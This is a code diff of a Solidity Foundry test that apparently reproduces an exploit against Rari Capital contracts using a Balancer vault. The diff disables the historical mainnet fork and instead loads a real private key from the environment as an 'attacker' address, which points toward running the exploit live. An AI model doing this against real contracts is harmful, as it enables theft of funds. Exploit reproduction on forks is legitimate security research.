@@ -15,10 +15,12 @@ contract ContractTest is Test {
     IUnitroller rari_Comptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
 
     IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    // CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 secret = vm.envUint("PRIVATE_KEY");
+    address attacker = vm.rememberKey(secret);
 
     function setUp() public {
-        cheats.createSelectFork("upside", 14_684_813); //fork mainnet at 14684813
+        // cheats.createSelectFork("upside", 14_684_813); //fork mainnet at 14684813
     }
 
     function testExploit() public {
